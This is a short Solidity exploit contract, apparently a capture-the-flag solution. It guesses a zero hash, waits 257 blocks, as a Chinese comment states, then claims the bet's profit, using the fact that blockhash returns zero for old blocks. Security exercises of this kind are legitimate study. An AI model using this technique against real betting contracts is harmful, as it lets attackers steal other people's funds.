// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
contract attack{
    bet public tar;
    function attack1(address t)public{
        tar=bet(t);
        tar.cseNumber(bytes32(0));
    }
    //step1之后等待257区块
    function attack2()public{
        tar.bet2profit();
        tar.isComplete();
    }
}